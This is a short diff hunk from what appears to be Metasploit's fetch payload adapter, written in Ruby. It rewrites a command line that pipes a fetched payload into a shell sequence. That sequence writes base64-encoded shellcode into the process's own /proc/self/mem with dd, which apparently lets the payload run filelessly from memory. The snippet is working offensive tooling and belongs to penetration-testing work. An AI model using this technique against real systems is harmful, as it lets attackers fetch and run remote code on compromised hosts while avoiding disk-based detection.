@@ -255,7 +255,7 @@ module Msf::Payload::Adapter::Fetch
 #    cmd << '; done'
 #    cmd << '; fi'
 #    cmd << '; done'
-     "#{get_file_cmd} | bash -c 'cd /*/$$;read a<*l;exec 3>mem;base64 -d<<<SIngTTHSSIM4AHUQSIN4CCF1CUiD6AhJicLrD0iDwAjr5EyJ0E0x200x5EiDOAB1CUiDwAhJicTrBkiD6Ajr60iJ5UiB7BIEAABIuGtlcm5lbAAAagBQuD8BAABIiedIMfYPBUmJwLgAAAAAvwAAAABIiea6AAQAAA8FSInCSIP6AH4PuAEAAABMicdIieYPBevUuEIBAABMicdqAEiJ5moAVEiJ4kgxyU0xyU2J4kG4ABAAAA8FuDwAAAC/YwAAAA8FAAAAAAA=|dd bs=1 seek=$[`cut -d\  -f9<<<$a`]>&3'"
+     "#{get_file_cmd} | $(cd /proc/self;read a<syscall;exec 3>mem;base64 -d<<<SIngTTHSSIM4AHUQSIN4CCF1CUiD6AhJicLrD0iDwAjr5EyJ0E0x200x5EiDOAB1CUiDwAhJicTrBkiD6Ajr60iJ5UiB7BIEAABIuGtlcm5lbAAAagBQuD8BAABIiedIMfYPBUmJwLgAAAAAvwAAAABIiea6AAQAAA8FSInCSIP6AH4PuAEAAABMicdIieYPBevUuEIBAABMicdqAEiJ5moAVEiJ4kgxyU0xyU2J4kG4ABAAAA8FuDwAAAC/YwAAAA8FAAAAAAA=|dd bs=1 seek=$[`cut -d\  -f9<<<$a`]>&3')"
   end
 
   def _generate_curl_command
